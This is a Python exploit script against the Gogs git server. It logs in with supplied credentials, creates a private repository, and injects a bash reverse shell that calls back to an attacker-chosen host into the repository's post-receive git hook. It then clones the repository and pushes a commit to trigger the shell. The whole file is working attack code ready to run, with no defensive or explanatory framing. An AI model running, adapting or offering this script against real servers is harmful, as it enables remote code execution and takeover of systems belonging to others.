import requests
import argparse
from bs4 import BeautifulSoup
import urllib.parse
import subprocess
import os
from urllib.parse import quote
from colorama import Fore, Style, init

init(autoreset=True)

print(f"""{Fore.GREEN}{Style.BRIGHT}
                               _                 _             
                              | |               | |            
   __ _  ___   __ _ ___ ______| |__   ___   ___ | | _____ _ __ 
  / _` |/ _ \ / _` / __|______| '_ \ / _ \ / _ \| |/ / _ \ '__|
 | (_| | (_) | (_| \__ \      | | | | (_) | (_) |   <  __/ |   
  \__, |\___/ \__, |___/      |_| |_|\___/ \___/|_|\_\___|_|   
   __/ |       __/ |                                           
  |___/       |___/                                            

{Style.RESET_ALL}""")

parser = argparse.ArgumentParser(description="Gogs RCE Exploit Script")
parser.add_argument("--url", required=True, help="Base URL of the Gogs instance (e.g., http://192.168.1.10:3000)")
parser.add_argument("--username", required=True, help="Username for login")
parser.add_argument("--password", required=True, help="Password for login")
parser.add_argument("--lhost", required=True, help="Your IP address for reverse shell callback")
parser.add_argument("--lport", default="4444", help="Listening port (default: 4444)")
args = parser.parse_args()

# Safely encode username and password for use in a URL
safe_username = quote(args.username) 
safe_password = quote(args.password)

# Start a session to persist cookies
session = requests.Session()
login_url = args.url.rstrip("/") + "/user/login"

# Request login page and extract CSRF token
resp = session.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf_token = soup.find("input", {"name": "_csrf"})["value"]

# Submit login form
data = {
    "_csrf": csrf_token,
    "user_name": args.username,
    "password": args.password,
    "login": "Login"
}
resp = session.post(login_url, data=data)

# Check if login was successful
if "Username or password is not correct" in resp.text:
    print("[-] Login failed.")
else:
    print("[+] Login successful!")

# Navigate to the repo creation page and extract necessary values
repo_create_url = args.url.rstrip("/") + "/repo/create"
resp = session.get(repo_create_url)
soup = BeautifulSoup(resp.text, "html.parser")
csrf_token = soup.find("input", {"name": "_csrf"})["value"]
user_id = soup.find("input", {"name": "user_id"})["value"]

# Create a new repository
repo_name = "totally-safe-repo"
data = {
    "_csrf": csrf_token,
    "user_id": user_id,
    "repo_name": repo_name,
    "private": "on",
    "description": "",
    "gitignores": "",
    "license": "",
    "readme": "Default"
}
resp = session.post(repo_create_url, data=data)

if resp.status_code == 200:
    print("[+] Repo created successfully!")
else:
    print("[-] Repo creation failed. Check manually.")

# Open Git hook configuration page and extract CSRF token
hooks_post_receive_url = args.url.rstrip("/") + f"/{args.username}/{repo_name}/settings/hooks/git/post-receive"
resp = session.get(hooks_post_receive_url)
soup = BeautifulSoup(resp.text, "html.parser")
csrf_token = soup.find("input", {"name": "_csrf"})["value"]

# Inject a reverse shell payload into the post-receive Git hook
payload = f"""#!/bin/bash
bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1
"""
data = {
    "_csrf": csrf_token,
    "content": payload
}
resp = session.post(hooks_post_receive_url, data=data)

if resp.status_code == 200:
    print("[+] Git hook injected successfully!")
else:
    print("[-] Git hook injection may have failed. Check manually.")

# Prepare to trigger the Git hook
clone_url = f"{args.url.rstrip('/')}/{args.username}/{repo_name}.git"
clone_url_with_auth = f"http://{safe_username}:{safe_password}@{args.url.split('//')[1].rstrip('/')}/{args.username}/{repo_name}.git"

# Remove local folder if it already exists
if os.path.exists(repo_name):
    print(f"[!] Folder '{repo_name}' already exists. Removing it.")
    subprocess.run(["rm", "-rf", repo_name], check=True)

# Clone the repo and make a new commit to trigger the hook
try:
    subprocess.run(["git", "clone", clone_url_with_auth], check=True)
except subprocess.CalledProcessError:
    print("[-] Git clone failed. Check credentials or repo URL.")
    exit(1)

os.chdir(repo_name)
filename = f"update_{int(__import__('time').time())}.txt"
subprocess.run(["touch", filename], check=True)
subprocess.run(["git", "add", filename], check=True)

subprocess.run(["git", "config", "user.email", f"{args.username}@exploit.local"], check=True)
subprocess.run(["git", "config", "user.name", args.username], check=True)

subprocess.run(["git", "commit", "-m", "Triggering hook..."], check=True)
subprocess.run(["git", "push", "origin", "master"], check=True)

print(f"{Fore.GREEN}[+] Git hook triggered! Listen for shell 😈{Style.RESET_ALL}")
